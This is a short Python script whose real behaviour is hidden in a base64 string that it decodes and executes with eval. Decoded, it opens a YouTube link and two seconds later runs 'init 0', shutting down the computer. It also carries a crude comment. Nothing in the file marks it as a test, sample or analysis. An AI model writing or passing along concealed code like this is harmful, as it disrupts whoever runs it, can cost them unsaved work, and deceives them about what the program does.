import base64

myscript = """aW1wb3J0IG9zCmltcG9ydCB3ZWJicm93c2VyCmltcG9ydCB0aW1lCgojcHV0YQoKd2ViYnJvd3Nlci5vcGVuKCJodHRwOi8vd3d3LnlvdXR1YmUuY29tL3dhdGNoP3Y9U013WnNGS0lYYTgmYW1wIikKdGltZS5zbGVlcCgyKQpvcy5zeXN0ZW0oImluaXQgMCIp """
eval(compile(base64.b64decode(myscript), '<string>', 'exec'))
